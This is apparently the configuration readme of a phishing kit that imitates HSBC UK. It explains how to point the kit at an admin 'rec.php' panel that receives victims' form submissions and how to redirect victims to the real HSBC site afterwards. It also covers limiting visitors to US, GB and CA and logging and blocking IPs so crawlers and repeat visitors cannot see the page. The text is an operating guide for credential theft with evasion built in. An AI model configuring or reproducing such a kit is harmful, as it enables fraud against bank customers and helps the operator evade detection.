*)Chmod ips.txt (for ip logger), visits.txt (for hits recording) and to 777.

*)In control.php replace the following fields


$panel_rec="http://www.domain.com/rec.php"; // Entere here the FULL URL to your admin's rec file. Present in admin/func/ directory. This is the connector

$pageonline=0;  will turn page off
$pageonline=1;  will turn page on


$out_url="https://href.li/?https://www.hsbc.co.uk"; // This is the URl where user will redirect after form completion.

$country_block=1;  will allow only selected countries visitors 
$country_block=0;  will allow all visitors

$allowed_countries=array("US","GB","CA"); // Enter here the countries standard 2-character codes to allow them. It will only work if country block is activated

$ip_logger=0;  will turn ip logger off
$ip_logger=1;  will turn ip logger on
*) if ip_logger is enabled
Each visit will save IP on ips.txt, you will have to clear your IP from ips.txt from re-enabling you or anyone to visit the link again
Even if ip_logger is NOT enable, any IP that is present inside ips.txt will be blocked. In that way you can block known IP's of crawlers.

